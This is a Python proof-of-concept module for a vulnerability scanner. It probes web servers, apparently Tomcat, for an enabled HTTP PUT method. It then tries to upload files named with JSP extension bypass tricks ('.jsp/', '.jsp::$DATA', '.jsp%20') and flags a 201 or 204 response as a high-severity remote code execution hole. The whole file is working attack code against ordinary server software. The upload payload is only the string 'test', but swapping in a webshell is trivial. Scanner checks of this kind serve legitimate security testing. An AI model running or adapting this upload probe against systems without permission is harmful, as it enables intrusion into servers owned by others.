#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import time
from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script, VUL_TYPE, VUL_LEVEL

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'http put'
        self.keyword = ['web', 'tomcat']
        self.info = 'http put'
        self.type = VUL_TYPE.RCE
        self.level = VUL_LEVEL.HIGH
        self.repair = ''
        self.refer = ''
        Script.__init__(self, target=target, service_type=self.service_type)


    async def prove(self):
        await self.get_url()
        if self.base_url != None:
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.url, './'),
            ]))
            async with ClientSession() as session:
                for path in path_list:
                    async with session.options(url=path+"testbyme") as response:
                        if response!=None and 'Allow' in response.headers and 'PUT' in response.headers['Allow']:
                            for _url in [str(int(time.time())) + '.jsp/',str(int(time.time())) + '.jsp::$DATA',str(int(time.time())) + '.jsp%20']:
                                url =  path + _url
                                async with session.put(url=url, data='test') as response:
                                    if response != None:
                                        if response.status == 201 or response.status == 204:
                                            self.flag = 1
                                            self.req.append({"method": "put"})
                                            self.res.append({"info": url,"key":"PUT"})
